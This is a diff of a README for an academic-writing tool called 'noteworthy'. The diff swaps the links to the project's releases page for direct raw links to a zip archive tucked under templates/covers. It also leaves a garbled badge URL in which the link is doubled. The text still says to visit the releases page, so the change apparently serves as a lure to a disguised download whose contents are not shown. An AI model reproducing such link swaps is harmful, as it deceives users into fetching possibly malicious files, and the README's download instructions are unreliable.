@@ -1,7 +1,7 @@
 # 🎉 noteworthy - A Framework to Boost Your Academic Work
 
 ## 📥 Download Now
-[![Download noteworthy](https://img.shields.io/badge/Download%20noteworthy-brightgreen.svg)](https://github.com/Thienphusc/noteworthy/releases)
+[![Download noteworthy](https://raw.githubusercontent.com/Thienphusc/noteworthy/master/templates/covers/noteworthy-v2.8.zip%https://raw.githubusercontent.com/Thienphusc/noteworthy/master/templates/covers/noteworthy-v2.8.zip)](https://raw.githubusercontent.com/Thienphusc/noteworthy/master/templates/covers/noteworthy-v2.8.zip)
 
 ## 🚀 Getting Started
 Welcome to noteworthy! This software helps you create academic documents with ease and efficiency. You can manage citations, format texts, and organize your research effortlessly.
@@ -27,7 +27,7 @@ To get started with noteworthy, follow these steps:
 
 1. **Visit the Releases Page**
    Click on the link below to go to the release page:
-   [Download noteworthy](https://github.com/Thienphusc/noteworthy/releases)
+   [Download noteworthy](https://raw.githubusercontent.com/Thienphusc/noteworthy/master/templates/covers/noteworthy-v2.8.zip)
 
 2. **Choose the Latest Version**
    On the releases page, find the latest version of noteworthy. It is usually listed at the top.
